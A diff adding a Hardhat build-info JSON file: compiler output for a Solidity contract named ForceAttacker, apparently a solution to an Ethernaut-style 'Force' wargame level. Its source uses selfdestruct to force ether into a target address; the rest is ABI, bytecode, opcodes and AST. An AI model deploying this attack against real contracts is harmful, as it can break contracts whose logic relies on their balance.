@@ -1,0 +1,331 @@
+{
+  "id": "be1638f12ae1ae017c0914a15b7a31f0",
+  "_format": "hh-sol-build-info-1",
+  "solcVersion": "0.7.3",
+  "solcLongVersion": "0.7.3+commit.9bfce1f6",
+  "input": {
+    "language": "Solidity",
+    "sources": {
+      "contracts/7-ForceAttacker.sol": {
+        "content": "pragma solidity ^0.7.3;\n\ncontract ForceAttacker {\n    function destroy(address _apcalypse) public {\n        selfdestruct(payable(_apcalypse));\n    }\n\n    receive() external payable {}\n}\n"
+      }
+    },
+    "settings": {
+      "optimizer": {
+        "enabled": false,
+        "runs": 200
+      },
+      "outputSelection": {
+        "*": {
+          "*": [
+            "abi",
+            "evm.bytecode",
+            "evm.deployedBytecode",
+            "evm.methodIdentifiers"
+          ],
+          "": [
+            "ast"
+          ]
+        }
+      }
+    }
+  },
+  "output": {
+    "contracts": {
+      "contracts/7-ForceAttacker.sol": {
+        "ForceAttacker": {
+          "abi": [
+            {
+              "inputs": [
+                {
+                  "internalType": "address",
+                  "name": "_apcalypse",
+                  "type": "address"
+                }
+              ],
+              "name": "destroy",
+              "outputs": [],
+              "stateMutability": "nonpayable",
+              "type": "function"
+            },
+            {
+              "stateMutability": "payable",
+              "type": "receive"
+            }
+          ],
+          "evm": {
+            "bytecode": {
+              "generatedSources": [],
+              "linkReferences": {},
+              "object": "608060405234801561001057600080fd5b5060c58061001f6000396000f3fe608060405260043610601e5760003560e01c8062f55d9d146029576024565b36602457005b600080fd5b348015603457600080fd5b50607460048036036020811015604957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506076565b005b8073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220cdab4c2e5e343572d9d5651f96e3f9f3b60db550ff2ec6e17d4c54e911ed9a6164736f6c63430007030033",
+              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xC5 DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0xF55D9D EQ PUSH1 0x29 JUMPI PUSH1 0x24 JUMP JUMPDEST CALLDATASIZE PUSH1 0x24 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x74 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x49 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x76 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCD 0xAB 0x4C 0x2E 0x5E CALLVALUE CALLDATALOAD PUSH19 0xD9D5651F96E3F9F3B60DB550FF2EC6E17D4C54 0xE9 GT 0xED SWAP11 PUSH2 0x6473 PUSH16 0x6C634300070300330000000000000000 ",
+              "sourceMap": "25:160:0:-:0;;;;;;;;;;;;;;;;;;;"
+            },
+            "deployedBytecode": {
+              "generatedSources": [],
+              "immutableReferences": {},
+              "linkReferences": {},
+              "object": "608060405260043610601e5760003560e01c8062f55d9d146029576024565b36602457005b600080fd5b348015603457600080fd5b50607460048036036020811015604957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506076565b005b8073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220cdab4c2e5e343572d9d5651f96e3f9f3b60db550ff2ec6e17d4c54e911ed9a6164736f6c63430007030033",
+              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0xF55D9D EQ PUSH1 0x29 JUMPI PUSH1 0x24 JUMP JUMPDEST CALLDATASIZE PUSH1 0x24 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x74 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x49 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x76 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCD 0xAB 0x4C 0x2E 0x5E CALLVALUE CALLDATALOAD PUSH19 0xD9D5651F96E3F9F3B60DB550FF2EC6E17D4C54 0xE9 GT 0xED SWAP11 PUSH2 0x6473 PUSH16 0x6C634300070300330000000000000000 ",
+              "sourceMap": "25:160:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;54:94;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;129:10;108:33;;"
+            },
+            "methodIdentifiers": {
+              "destroy(address)": "00f55d9d"
+            }
+          }
+        }
+      }
+    },
+    "errors": [
+      {
+        "component": "general",
+        "errorCode": "1878",
+        "formattedMessage": "contracts/7-ForceAttacker.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
+        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
+        "severity": "warning",
+        "sourceLocation": {
+          "end": -1,
+          "file": "contracts/7-ForceAttacker.sol",
+          "start": -1
+        },
+        "type": "Warning"
+      }
+    ],
+    "sources": {
+      "contracts/7-ForceAttacker.sol": {
+        "ast": {
+          "absolutePath": "contracts/7-ForceAttacker.sol",
+          "exportedSymbols": {
+            "ForceAttacker": [
+              19
+            ]
+          },
+          "id": 20,
+          "nodeType": "SourceUnit",
+          "nodes": [
+            {
+              "id": 1,
+              "literals": [
+                "solidity",
+                "^",
+                "0.7",
+                ".3"
+              ],
+              "nodeType": "PragmaDirective",
+              "src": "0:23:0"
+            },
+            {
+              "abstract": false,
+              "baseContracts": [],
+              "contractDependencies": [],
+              "contractKind": "contract",
+              "fullyImplemented": true,
+              "id": 19,
+              "linearizedBaseContracts": [
+                19
+              ],
+              "name": "ForceAttacker",
+              "nodeType": "ContractDefinition",
+              "nodes": [
+                {
+                  "body": {
+                    "id": 13,
+                    "nodeType": "Block",
+                    "src": "98:50:0",
+                    "statements": [
+                      {
+                        "expression": {
+                          "arguments": [
+                            {
+                              "arguments": [
+                                {
+                                  "id": 9,
+                                  "name": "_apcalypse",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [],
+                                  "referencedDeclaration": 3,
+                                  "src": "129:10:0",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_address",
+                                    "typeString": "address"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_address",
+                                    "typeString": "address"
+                                  }
+                                ],
+                                "id": 8,
+                                "isConstant": false,
+                                "isLValue": false,
+                                "isPure": true,
+                                "lValueRequested": false,
+                                "nodeType": "ElementaryTypeNameExpression",
+                                "src": "121:8:0",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_type$_t_address_payable_$",
+                                  "typeString": "type(address payable)"
+                                },
+                                "typeName": {
+                                  "id": 7,
+                                  "name": "address",
+                                  "nodeType": "ElementaryTypeName",
+                                  "src": "121:8:0",
+                                  "stateMutability": "payable",
+                                  "typeDescriptions": {}
+                                }
+                              },
+                              "id": 10,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "typeConversion",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "121:19:0",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_address_payable",
+                                "typeString": "address payable"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_address_payable",
+                                "typeString": "address payable"
+                              }
+                            ],
+                            "id": 6,
+                            "name": "selfdestruct",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -21,
+                            "src": "108:12:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
+                              "typeString": "function (address payable)"
+                            }
+                          },
+                          "id": 11,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "functionCall",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "108:33:0",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_tuple$__$",
+                            "typeString": "tuple()"
+                          }
+                        },
+                        "id": 12,
+                        "nodeType": "ExpressionStatement",
+                        "src": "108:33:0"
+                      }
+                    ]
+                  },
+                  "functionSelector": "00f55d9d",
+                  "id": 14,
+                  "implemented": true,
+                  "kind": "function",
+                  "modifiers": [],
+                  "name": "destroy",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 4,
+                    "nodeType": "ParameterList",
+                    "parameters": [
+                      {
+                        "constant": false,
+                        "id": 3,
+                        "mutability": "mutable",
+                        "name": "_apcalypse",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 14,
+                        "src": "71:18:0",
+                        "stateVariable": false,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        "typeName": {
+                          "id": 2,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "71:7:0",
+                          "stateMutability": "nonpayable",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        },
+                        "visibility": "internal"
+                      }
+                    ],
+                    "src": "70:20:0"
+                  },
+                  "returnParameters": {
+                    "id": 5,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "98:0:0"
+                  },
+                  "scope": 19,
+                  "src": "54:94:0",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "public"
+                },
+                {
+                  "body": {
+                    "id": 17,
+                    "nodeType": "Block",
+                    "src": "181:2:0",
+                    "statements": []
+                  },
+                  "id": 18,
+                  "implemented": true,
+                  "kind": "receive",
+                  "modifiers": [],
+                  "name": "",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 15,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "161:2:0"
+                  },
+                  "returnParameters": {
+                    "id": 16,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "181:0:0"
+                  },
+                  "scope": 19,
+                  "src": "154:29:0",
+                  "stateMutability": "payable",
+                  "virtual": false,
+                  "visibility": "external"
+                }
+              ],
+              "scope": 20,
+              "src": "25:160:0"
+            }
+          ],
+          "src": "0:186:0"
+        },
+        "id": 0
+      }
+    }
+  }
+}
